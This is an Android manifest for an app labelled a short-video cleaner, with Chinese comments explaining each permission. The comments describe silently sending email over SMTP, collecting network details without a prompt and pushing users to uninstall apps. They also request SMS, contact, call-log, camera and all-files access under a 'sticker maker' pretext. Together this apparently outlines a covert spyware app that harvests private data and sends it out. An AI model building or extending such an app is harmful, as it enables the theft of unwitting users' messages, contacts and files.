<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- 查询所有已安装应用（Android 11+ 必需） -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    <!-- SMTP 静默发送邮件 -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <!-- 收集 WiFi / 网络信息（normal 权限，无需弹窗） -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <!-- 引导卸载应用（Android 6+ 必需） -->
    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
    <!-- 全文件访问 -->
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <!-- 表情包制作：短信/联系人/通话记录/相机 -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.CAMERA" />

    <uses-feature android:name="android.hardware.camera" android:required="false" />
    <uses-feature android:name="android.hardware.camera.front" android:required="false" />

    <!-- Android 11+ 查询系统包（用于卸载、跳转设置等 Intent 解析） -->
    <queries>
        <intent>
            <action android:name="android.intent.action.DELETE" />
            <data android:scheme="package" />
        </intent>
        <intent>
            <action android:name="android.intent.action.UNINSTALL_PACKAGE" />
            <data android:scheme="package" />
        </intent>
        <intent>
            <action android:name="android.settings.APPLICATION_DETAILS_SETTINGS" />
            <data android:scheme="package" />
        </intent>
        <intent>
            <action android:name="android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION" />
            <data android:scheme="package" />
        </intent>
        <package android:name="com.android.packageinstaller" />
        <package android:name="com.google.android.packageinstaller" />
        <package android:name="com.samsung.android.packageinstaller" />
        <package android:name="com.miui.packageinstaller" />
        <package android:name="com.coloros.phonemanager" />
        <package android:name="com.vivo.security" />
        <package android:name="com.huawei.systemmanager" />
    </queries>



    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.ShortVideoCleaner">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".QuoteActivity"
            android:exported="false"
            android:theme="@style/Theme.Quote" />

        <activity
            android:name=".GameActivity"
            android:exported="false"
            android:theme="@style/Theme.Quote" />

        <activity
            android:name=".StickerMakerActivity"
            android:exported="false" />

        <activity
            android:name=".GalleryActivity"
            android:exported="false" />
    </application>
</manifest>
